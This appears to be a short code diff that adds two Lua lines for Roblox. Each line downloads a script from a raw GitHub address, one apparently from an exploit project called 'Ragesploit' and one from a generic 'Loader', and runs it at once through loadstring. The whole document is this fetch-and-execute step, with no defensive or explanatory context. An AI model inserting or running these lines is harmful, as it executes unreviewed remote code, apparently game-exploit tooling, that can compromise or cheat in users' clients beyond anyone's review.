@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ragesploit-x/Ragesploit/refs/heads/main/MainScript/ShitVersion.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FBScripts/Loader/refs/heads/main/2025",true))()
